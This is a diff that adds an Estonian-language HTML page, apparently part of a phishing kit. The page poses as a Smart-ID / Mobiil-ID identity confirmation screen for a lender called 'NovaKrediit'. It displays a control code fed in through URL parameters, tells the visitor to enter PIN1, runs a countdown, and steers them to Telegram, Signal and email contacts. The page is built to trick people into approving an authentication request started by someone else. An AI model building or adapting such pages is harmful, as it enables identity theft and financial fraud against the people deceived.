@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="et">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>NovaKrediit — Kinnitage oma isik</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Plus+Jakarta+Sans:wght@700;800;900&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{
+  font-family:'Inter',sans-serif;
+  background:#0f172a;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+}
+
+.card{
+  background:#fff;
+  border-radius:24px;
+  max-width:380px;
+  width:100%;
+  padding:32px 24px 28px;
+  text-align:center;
+  box-shadow:0 24px 80px rgba(0,0,0,0.5);
+}
+
+/* LOGO */
+.logo-box{
+  display:inline-flex;
+  flex-direction:column;
+  align-items:center;
+  gap:3px;
+  background:#fff;
+  border:1.5px solid #e5e7eb;
+  border-radius:14px;
+  padding:10px 24px;
+  box-shadow:0 2px 12px rgba(0,0,0,0.08);
+  margin-bottom:18px;
+}
+.logo-method{
+  font-family:'Plus Jakarta Sans',sans-serif;
+  font-weight:900;
+  font-size:1.3rem;
+  color:#0a1628;
+  letter-spacing:0.05em;
+}
+.logo-sub{
+  font-size:0.55rem;
+  color:#9ca3af;
+  letter-spacing:0.12em;
+  text-transform:uppercase;
+}
+
+/* TITLE */
+.title{
+  font-family:'Plus Jakarta Sans',sans-serif;
+  font-weight:800;
+  font-size:1.15rem;
+  color:#0a1628;
+  margin-bottom:6px;
+}
+.subtitle{
+  color:#6b7a99;
+  font-size:0.8rem;
+  line-height:1.6;
+  margin-bottom:18px;
+}
+
+/* CODE */
+.code-box{
+  background:#0a1628;
+  border-radius:14px;
+  padding:20px 16px 16px;
+  margin-bottom:20px;
+}
+.code-number{
+  font-family:'Plus Jakarta Sans',sans-serif;
+  font-size:3rem;
+  font-weight:900;
+  color:#fff;
+  letter-spacing:0.22em;
+  line-height:1;
+}
+.code-label{
+  font-size:0.6rem;
+  color:rgba(255,255,255,0.35);
+  margin-top:6px;
+  text-transform:uppercase;
+  letter-spacing:0.12em;
+}
+
+/* TIMER CERCLE CSS */
+.timer-wrap{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:8px;
+  margin-bottom:18px;
+}
+.timer-circle{
+  position:relative;
+  width:80px;
+  height:80px;
+}
+.timer-svg{
+  transform:rotate(-90deg);
+  width:80px;
+  height:80px;
+}
+.timer-bg{
+  fill:none;
+  stroke:#e5e7eb;
+  stroke-width:5;
+}
+.timer-arc{
+  fill:none;
+  stroke:#3b82f6;
+  stroke-width:5;
+  stroke-linecap:round;
+  stroke-dasharray:201.06;
+  stroke-dashoffset:0;
+  /* Animation CSS pure — 120 secondes */
+  animation:drain 120s linear forwards;
+}
+@keyframes drain{
+  0%  { stroke-dashoffset:0;    stroke:#3b82f6; }
+  75% { stroke-dashoffset:150;  stroke:#3b82f6; }
+  83% { stroke-dashoffset:167;  stroke:#ef4444; }
+  100%{ stroke-dashoffset:201.06; stroke:#ef4444; }
+}
+.timer-text{
+  position:absolute;
+  inset:0;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-family:'Plus Jakarta Sans',sans-serif;
+  font-weight:900;
+  font-size:0.95rem;
+  color:#1d4ed8;
+}
+.timer-label{
+  font-size:0.82rem;
+  color:#1d4ed8;
+  font-weight:600;
+}
+
+/* CONTACT DÈS LE DÉBUT */
+.contact-bar{
+  background:#f0f9ff;
+  border:1px solid #bae6fd;
+  border-radius:10px;
+  padding:10px 14px;
+  margin-bottom:10px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+}
+.contact-bar-text{
+  font-size:0.76rem;
+  color:#0369a1;
+  font-weight:500;
+}
+.contact-bar-btn{
+  background:#0a1628;
+  color:#fff;
+  border:none;
+  border-radius:6px;
+  padding:6px 12px;
+  font-size:0.74rem;
+  font-weight:700;
+  cursor:pointer;
+  font-family:'Inter',sans-serif;
+}
+
+.channels{
+  display:none;
+  background:#f8fafc;
+  border:1px solid #e2e8f0;
+  border-radius:10px;
+  padding:12px;
+  margin-bottom:10px;
+  flex-direction:column;
+  gap:7px;
+}
+.channels.open{ display:flex; }
+.ch-btn{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  border-radius:8px;
+  padding:10px;
+  font-size:0.82rem;
+  font-weight:700;
+  text-decoration:none;
+  color:#fff;
+}
+.ch-tg{ background:#2AABEE; }
+.ch-sig{ background:#3a76f0; }
+.ch-mail{ background:#0a1628; }
+
+/* EXPIRATION */
+.expired-box{
+  display:none;
+  background:#fff7ed;
+  border:1px solid #fed7aa;
+  border-radius:10px;
+  padding:14px;
+  margin-bottom:10px;
+  text-align:center;
+}
+.expired-title{
+  font-size:0.86rem;
+  font-weight:700;
+  color:#c2410c;
+  margin-bottom:4px;
+}
+.expired-sub{
+  font-size:0.76rem;
+  color:#9a3412;
+  margin-bottom:12px;
+}
+
+.hint{
+  font-size:0.7rem;
+  color:#9ca3af;
+  line-height:1.5;
+}
+
+/* DOSSIER */
+.dossier-box{
+  background:#f7f8fa;
+  border:1px solid #e5e7eb;
+  border-radius:10px;
+  padding:10px 14px;
+  margin-bottom:16px;
+  text-align:left;
+}
+.dossier-label{
+  font-size:0.65rem;
+  text-transform:uppercase;
+  letter-spacing:0.1em;
+  color:#9ca3af;
+  margin-bottom:3px;
+}
+.dossier-num{
+  font-family:'Plus Jakarta Sans',sans-serif;
+  font-weight:800;
+  font-size:1.1rem;
+  color:#0a1628;
+}
+
+@media(max-width:400px){
+  .card{padding:24px 16px 20px;}
+  .code-number{font-size:2.4rem;}
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+
+  <!-- Logo méthode -->
+  <div class="logo-box">
+    <span class="logo-method" id="method-label">Smart-ID</span>
+    <span class="logo-sub">SK ID Solutions</span>
+  </div>
+
+  <!-- Titre -->
+  <h1 class="title">Kinnitage oma isik</h1>
+  <p class="subtitle">Kontrollige, et teie seadmes kuvatav kood<br>ühtib alloleva koodiga, ja sisestage PIN1.</p>
+
+  <!-- Code -->
+  <div class="code-box">
+    <div class="code-number" id="code-display">7225</div>
+    <div class="code-label">Kontrollkood</div>
+  </div>
+
+  <!-- Timer cercle CSS -->
+  <div class="timer-wrap">
+    <div class="timer-circle">
+      <svg class="timer-svg" viewBox="0 0 80 80">
+        <circle class="timer-bg" cx="40" cy="40" r="32"/>
+        <circle class="timer-arc" id="timer-arc" cx="40" cy="40" r="32"/>
+      </svg>
+      <div class="timer-text" id="timer-text">2:00</div>
+    </div>
+    <span class="timer-label" id="wait-label">Ootan teie kinnitust…</span>
+  </div>
+
+  <!-- Numéro dossier -->
+  <div class="dossier-box">
+    <div class="dossier-label">Dossieri number</div>
+    <div class="dossier-num" id="dossier-display">NK-2026-0000</div>
+  </div>
+
+  <!-- Contact dès le début -->
+  <div class="contact-bar">
+    <span class="contact-bar-text">Vajate abi?</span>
+    <button class="contact-bar-btn" onclick="toggleChannels()">Võtke ühendust</button>
+  </div>
+
+  <!-- Canaux (toggle) -->
+  <div class="channels" id="channels">
+    <a href="https://t.me/+37254505527" target="_blank" rel="noopener noreferrer" class="ch-btn ch-tg">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8l-1.69 7.96c-.12.56-.46.7-.93.43l-2.57-1.89-1.24 1.19c-.14.13-.25.25-.51.25l.18-2.59 4.71-4.25c.2-.18-.04-.28-.32-.1L7.9 14.47 5.37 13.7c-.55-.17-.56-.55.12-.82l9.28-3.58c.46-.17.86.11.87.5z" fill="white"/></svg>
+      Telegram
+    </a>
+    <a href="https://signal.me/#p/+37256186725" target="_blank" rel="noopener noreferrer" class="ch-btn ch-sig">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="white" opacity="0.3"/><path d="M12 7a5 5 0 100 10A5 5 0 0012 7z" fill="white"/></svg>
+      Signal
+    </a>
+    <a href="mailto:novakrediit@mail.ee" class="ch-btn ch-mail">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><rect x="2" y="4" width="20" height="16" rx="2" stroke="white" stroke-width="1.8"/><path d="M2 7l10 7 10-7" stroke="white" stroke-width="1.8"/></svg>
+      novakrediit@mail.ee
+    </a>
+  </div>
+
+  <!-- Message expiration (affiché après 2 min) -->
+  <div class="expired-box" id="expired-box">
+    <div class="expired-title">⏱ Kinnituse aeg on lõppenud</div>
+    <div class="expired-sub">Palun võtke meiega ühendust — aitame teid kohe!</div>
+    <div style="display:flex;flex-direction:column;gap:7px;">
+      <a href="https://t.me/+37254505527" target="_blank" rel="noopener noreferrer" class="ch-btn ch-tg">Telegram</a>
+      <a href="https://signal.me/#p/+37256186725" target="_blank" rel="noopener noreferrer" class="ch-btn ch-sig">Signal</a>
+      <a href="mailto:novakrediit@mail.ee" class="ch-btn ch-mail">novakrediit@mail.ee</a>
+    </div>
+  </div>
+
+  <p class="hint" id="hint-text">Kui kinnitust ei tule, kontrollige oma telefoni<br>ja veenduge et rakendus on avatud.</p>
+
+</div>
+
+<script>
+// Lire les paramètres URL
+function getParam(name){
+  var url=new URLSearchParams(window.location.search);
+  return url.get(name)||'';
+}
+
+var method=getParam('method')||'Smart-ID';
+var code=getParam('code')||String(Math.floor(1000+Math.random()*9000));
+var name=getParam('name')||'';
+var dossier=getParam('dossier')||'NK-'+new Date().getFullYear()+'-'+Math.floor(1000+Math.random()*9000);
+
+// Appliquer les valeurs
+document.getElementById('method-label').textContent=method;
+document.getElementById('method-label').style.color=method==='Mobiil-ID'?'#0055a5':'#0a1628';
+document.getElementById('code-display').textContent=code;
+document.getElementById('dossier-display').textContent=dossier;
+
+// Timer JS pour le texte (le cercle est animé en CSS)
+var total=120;
+var iv=setInterval(function(){
+  total--;
+  var m=Math.floor(total/60);
+  var s=total%60;
+  document.getElementById('timer-text').textContent=m+':'+(s<10?'0':'')+s;
+  document.getElementById('timer-text').style.color=total<=30?'#ef4444':'#1d4ed8';
+  if(total<=0){
+    clearInterval(iv);
+    // Afficher expiration
+    document.getElementById('expired-box').style.display='block';
+    document.getElementById('hint-text').style.display='none';
+    document.getElementById('wait-label').style.display='none';
+  }
+},1000);
+
+// Toggle canaux
+function toggleChannels(){
+  var c=document.getElementById('channels');
+  c.classList.toggle('open');
+}
+</script>
+</body>
+</html>
